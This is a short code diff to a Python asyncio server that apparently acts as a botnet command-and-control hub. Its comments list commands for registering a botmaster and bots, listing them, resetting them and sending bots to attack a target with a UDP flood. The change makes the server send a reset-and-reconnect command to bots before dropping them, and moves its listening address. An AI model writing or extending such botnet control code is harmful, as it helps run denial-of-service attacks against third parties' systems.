@@ -16,7 +16,7 @@ async def handle_client(reader, writer):
             break
         # register botmaster
         # list
-        # rst bot1/--all/--xx
+        # rst bot1/--all/--xx 10
         # attack bot2/--all/--xx udp 10.11.45.60 1 20
         # register bot1
         message = data.decode()
@@ -63,8 +63,11 @@ async def handle_client(reader, writer):
                     if bot_cnt == -2 and bot not in clients.keys():
                         res = f'{bot} not found'
                     if cmd == 'rst':
+                        bot_cmd = 'rst ' + para[2] # rst and reconnect after the specified time
                         if bot_cnt == -2:
                             bot_writer = clients[bot]
+                            bot_writer.write(bot_cmd.encode())
+                            await bot_writer.drain()
                             bot_writer.close()
                             #  await bot_writer.wait_closed()
                             del clients[bot]
@@ -77,6 +80,8 @@ async def handle_client(reader, writer):
                                     continue
                                 if bot_cnt >= 0 and i >= bot_cnt:
                                     break
+                                w.write(bot_cmd.encode())
+                                await w.drain()
                                 w.close()
                                 #  await w.wait_closed()
                                 to_delete.append(b)
@@ -110,7 +115,7 @@ async def handle_client(reader, writer):
 
 async def main():
     server = await asyncio.start_server(
-        handle_client, '192.168.100.5', 9999)
+        handle_client, '192.168.88.234', 9999)
 
     addr = server.sockets[0].getsockname()
     print(f'Serving on {addr}')
